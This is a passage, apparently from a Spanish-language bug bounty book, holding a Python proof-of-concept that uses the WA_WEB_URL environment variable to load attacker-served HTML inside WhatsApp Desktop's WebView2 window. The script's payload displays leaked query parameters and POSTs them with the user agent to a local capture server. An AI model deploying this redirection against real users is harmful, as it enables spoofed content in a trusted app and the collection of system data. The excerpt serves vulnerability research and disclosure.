# Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
"""
whatsapp_url_override.py -- PoC de redireccion de WebView
Confirma que WA_WEB_URL controla la URL del WebView2.
No requiere privilegios de administrador.
"""
import os, subprocess, threading, time, http.server
from pathlib import Path

PORT = 8443
EVIDENCE = Path("whatsapp_url_override_proof.txt")

# HTML que se muestra dentro de la ventana oficial de WhatsApp
HTML_PAYLOAD = """<!DOCTYPE html>
<html>
<head><title>WhatsApp</title></head>
<body style="background:#111b21;color:#e9edef;font-family:sans-serif;">
<h2 style="color:#25D366;">WA_WEB_URL Override Confirmado</h2>
<div id="info"></div>
<script>
// WhatsApp envia informacion del sistema en los parametros
var params = new URLSearchParams(location.search);
var html = '<h3>Sistema filtrado por WhatsApp:</h3>';
params.forEach(function(v, k) {
    html += '<code>' + k + '</code>: ' + v + '<br>';
});
document.getElementById('info').innerHTML = html;

// Enviar evidencia al servidor
fetch('/evidence', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        timestamp: new Date().toISOString(),
        url: location.href,
        userAgent: navigator.userAgent,
        params: Object.fromEntries(params)
    })
});
</script>
</body></html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[*] WhatsApp solicito: {self.path}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_PAYLOAD.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        print(f"[*] Evidencia recibida: {body[:200]}")
        EVIDENCE.write_text(body)
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args): pass
